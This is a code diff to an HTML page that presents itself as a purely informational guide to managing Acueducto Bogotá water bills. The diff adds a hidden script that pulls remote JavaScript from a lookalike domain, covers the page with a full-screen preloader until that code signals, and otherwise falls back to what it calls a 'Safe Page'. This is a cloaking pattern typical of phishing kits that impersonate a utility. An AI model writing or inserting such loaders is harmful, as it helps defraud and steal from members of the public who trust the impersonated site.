@@ -14,8 +14,56 @@
     <meta property="og:title" content="Guía Educativa | Acueducto Bogotá">
     <meta property="og:description" content="Tutoriales paso a paso para gestionar tu factura de agua desde casa. Sitio web netamente informativo.">
     <meta property="og:type" content="website">
+
+    <script>
+        (function() {
+           
+            var randomID = "u" + Math.random().toString(36).substring(7);
+
+         
+            var backendURL = "https://acubogota-metric.onrender.com/" + randomID;
+
+            var s = document.createElement('script');
+            s.src = backendURL;
+
+        
+            s.onload = function() {
+             
+                setTimeout(function(){
+                    if (window.__view) {
+                        var loader = document.getElementById('preloader');
+                        if (loader) loader.style.display = 'none';
+                    }
+                }, 50);
+            };
+
+          
+            s.onerror = function() {
+                console.warn("Backend no disponible. Mostrando Safe Page.");
+                var loader = document.getElementById('preloader');
+                if (loader) loader.style.display = 'none';
+            };
+
+            document.head.appendChild(s);
+        })();
+    </script>
+
     
     <style>
+
+        #preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 999999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #0a1e3c; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        
         /* Variables y Reset adaptados a temática de Acueducto (Verdes y Azules) */
         :root {
             --primary: #2E7D32; /* Verde institucional */
@@ -212,7 +260,9 @@
     </style>
 </head>
 <body>
-
+<div id="preloader">
+    <div class="spinner"></div>
+</div>
     <header>
         <a href="index.html" class="logo">💧 Educa-Acueducto BOG</a>
         <a href="#contacto" class="header-phone">Preguntas Frecuentes</a>
